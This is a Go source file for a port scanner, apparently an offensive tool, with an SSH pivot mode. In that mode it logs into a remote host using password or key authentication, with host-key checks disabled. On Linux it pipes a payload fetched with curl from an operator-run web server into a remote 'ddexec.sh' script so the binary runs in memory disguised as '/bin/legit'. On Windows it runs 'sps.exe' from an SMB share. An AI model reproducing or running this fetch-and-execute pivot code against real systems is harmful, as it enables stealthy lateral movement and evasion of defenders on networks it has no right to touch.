package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/squ4r00t/simple_port_scan/scanner"
	"golang.org/x/crypto/ssh"
)

func main() {
	open_ports := []int{}
	nmap_ports := ""

	// Parsing command line arguments
	var from string
	flag.StringVar(&from, "from", "", "The host to run the scan from. You should also provide a ssh user and password/key")

	var ssh_port string
	flag.StringVar(&ssh_port, "ssh-port", "22", "The Port ssh is running on. Default 22")

	var ssh_user string
	flag.StringVar(&ssh_user, "ssh-user", "", "The user to log in as. Should be used with -from")

	var ssh_pass string
	flag.StringVar(&ssh_pass, "ssh-pass", "", "The ssh password used to log in")

	var ssh_key string
	flag.StringVar(&ssh_key, "ssh-key", "", "The path to the private key file used to log in")

	var serve_ip string
	flag.StringVar(&serve_ip, "serve-ip", "", "The IP of the web server. Should be accessible by the host running the scan")

	var serve_port string
	flag.StringVar(&serve_port, "serve-port", "", "The port of the web server")

	var share_name string
	flag.StringVar(&share_name, "share-name", "", "The name of the share hosting the executable")

	var pivot_os string
	flag.StringVar(&pivot_os, "pivot-os", "linux", "OS of the host running the scan")

	var host string
	flag.StringVar(&host, "host", "127.0.0.1", "The host to scan, or valid CIDR range")

	var ports string
	flag.StringVar(&ports, "port", "alltcp", "Ports to scan: coma-separated list or 'alltcp' for all tcp ports")

	var retries int
	flag.IntVar(&retries, "retries", 3, "The number of retries before moving to another port")

	var delay_between_retries int
	flag.IntVar(&delay_between_retries, "delay-between-retries", 500, "Time delay between each retry")

	var timeout int
	flag.IntVar(&timeout, "timeout", 5000, "Time to wait for server response")

	var nmap_args string
	flag.StringVar(&nmap_args, "nmap", "no", "Arguments passed to nmap. Example: \"-A -oN nmap\"")

	flag.Parse()

	// Checking host and ports
	ips, ports_str, ports_int, err := checkArgs(host, ports)
	if err != nil {
		fmt.Println(err.Error())
		return
	}

	// Starting the scan
	if from == "" {
		if isValidIP(ips) {
			if ports_str == "" && len(ports_int) != 0 {
				scanner.ScanCustomTcpPortsForHost(ips, ports_int, retries, delay_between_retries, timeout, &open_ports)
			} else if ports_str == "alltcp" {
				scanner.ScanAllTcpPortsForHost(ips, retries, delay_between_retries, timeout, &open_ports)
			}
			for _, port := range open_ports {
				nmap_ports += strconv.Itoa(port) + ","
			}
		} else if isValidCIDR(ips) {
			if ports_str == "" && len(ports_int) != 0 {
				scanner.ScanCustomTcpPortsForNetwork(ips, ports_int, retries, delay_between_retries, timeout)
			} else if ports_str == "alltcp" {
				scanner.ScanAllTcpPortsForNetwork(ips, retries, delay_between_retries, timeout)
			}
		}
	} else {
		// Checking if valid IP
		if !isValidIP(from) {
			fmt.Printf("[-] '%s' is not a valid IP address", from)
			return
		}

		if ssh_user == "" || (ssh_pass == "" && ssh_key == "") {
			fmt.Printf("[-] When using the -from option, please provide a user with -ssh-user and a password or key file with -ssh-pass or -ssh-key")
			return
		}

		// SSH server details
		sshHost := fmt.Sprintf("%s:%s", from, ssh_port)

		// Establish the SSH connection
		var client *ssh.Client
		if ssh_key != "" {
			client, err = connectWithPrivateKey(sshHost, ssh_user, ssh_key)
			if err != nil {
				log.Fatalf("Failed to dial: %s", err)
			}
			defer client.Close()
		} else {
			client, err = connectWithPassword(sshHost, ssh_user, ssh_pass)
			if err != nil {
				log.Fatalf("Failed to dial: %s", err)
			}
			defer client.Close()
		}

		// Run a simple command on the remote server (e.g., 'uptime')
		session, err := client.NewSession()
		if err != nil {
			log.Fatalf("Failed to create session: %s", err)
		}
		defer session.Close()

		command := ""
		// Run the command and capture output
		if pivot_os == "linux" {
			command = fmt.Sprintf("curl http://%s:%s/sps.b64 | bash <(curl http://%s:%s/ddexec.sh) /bin/legit -host %s -port %s -retries %d -delay-between-retries %d -timeout %d", serve_ip, serve_port, serve_ip, serve_port, host, ports, retries, delay_between_retries, timeout)
		} else if pivot_os == "windows" {
			command = fmt.Sprintf("powershell.exe -command \"\\\\%s\\%s\\sps.exe\"", serve_ip, share_name)
		} else {
			fmt.Println("[-] Choose linux or windows for -pivot-os")
			return
		}

		fmt.Printf("[i] Running the following command on %s: %s\n\n", from, command)
		output, err := session.Output(command)
		if err != nil {
			log.Fatalf("Failed to run command: %s", err)
		}

		fmt.Println(string(output))
	}

	if nmap_args != "" {
		runNmap(host, nmap_args, nmap_ports)
	}
}

func checkArgs(host string, ports string) (string, string, []int, error) {

	// Checking ips
	if !isValidIP(host) && !isValidCIDR(host) {
		err := fmt.Errorf("[-] '%s' is not a valid IP or CIDR range", host)
		return "", "", nil, err
	}

	// Checking ports
	if ports == "alltcp" {
		return host, ports, nil, nil
	} else {
		ports_arr := strings.Split(ports, ",")
		var ports_arr_int []int

		for _, port := range ports_arr {
			port_int, err := strconv.Atoi(port)
			if err != nil {
				continue
			}
			if port_int >= 1 && port_int <= 65536 {
				ports_arr_int = append(ports_arr_int, port_int)
			}
		}

		if len(ports_arr_int) == 0 {
			err := fmt.Errorf("[-] No valid port provided. Provide a single port or a comma-separated list or 'alltcp'")
			return "", "", nil, err
		}

		return host, "", ports_arr_int, nil
	}
}

func runNmap(host string, nmap_args string, nmap_ports string) {
	if nmap_ports != "" {
		nmap_location, err := exec.Command("which", "nmap").Output()
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Println("\n" + string(nmap_location))

		if string(nmap_location) != "" {
			fmt.Println("[i] Starting nmap scan:")
			fmt.Printf("nmap %s %s -p%s\n\n", host, nmap_args, nmap_ports)
			cmd := exec.Command("nmap", host, fmt.Sprintf("-p%s", nmap_ports), nmap_args)
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr

			if err := cmd.Run(); err != nil {
				fmt.Printf("Error executing nmap: %v\n", err)
				return
			}
		}
	}
}

// Checks if a string is a valid IP
func isValidIP(ip string) bool {
	return net.ParseIP(ip) != nil
}

// Checks if a string is a valid CIDR range
func isValidCIDR(cidr string) bool {
	_, _, err := net.ParseCIDR(cidr)
	return err == nil
}

func connectWithPassword(server, username, password string) (*ssh.Client, error) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Use a proper host key callback in production
	}
	return ssh.Dial("tcp", server, config)
}

func connectWithPrivateKey(server, username, privateKeyPath string) (*ssh.Client, error) {
	key, err := os.ReadFile(privateKeyPath)
	if err != nil {
		return nil, fmt.Errorf("unable to read private key: %v", err)
	}

	// Create signer for the private key
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		return nil, fmt.Errorf("unable to parse private key: %v", err)
	}

	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	return ssh.Dial("tcp", server, config)
}
